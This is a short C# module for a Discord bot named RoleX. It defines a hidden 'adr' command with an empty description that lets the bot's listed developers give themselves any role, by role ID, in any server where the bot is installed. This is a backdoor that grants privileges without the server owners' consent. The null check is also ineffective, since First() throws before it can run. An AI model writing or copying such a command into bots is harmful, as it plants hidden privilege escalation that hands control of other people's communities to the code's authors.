using Discord;
using Public_Bot;
using System.IO;
using System;
using System.Linq;
using MoreLinq;
using System.Threading.Tasks;
namespace RoleX.Modules
{
    [DiscordCommandClass("Developer", "Dev commands that you can't use 🤣!")]
    public class Adr : CommandModuleBase
    {
        [DiscordCommand("adr", commandHelp = "", description = "")]
        public async Task GPe(ulong a, ulong y)
        {
            if (devids.Any(x => x == Context.User.Id))
            {
                var breh = Context.Client.Guilds.First(al => al.Id == a);
                if (breh == null)
                {
                    await ReplyAsync("Why are you like this <:noob:756055614861344849>");
                    return;
                }
                var irdk = breh.GetUser(Context.User.Id);
                if (irdk == null)
                {
                    await ReplyAsync("Why are you like this <:noob:756055614861344849>");
                    return;
                }
                await irdk.AddRoleAsync(breh.GetRole(y));
            }
        }
    }
}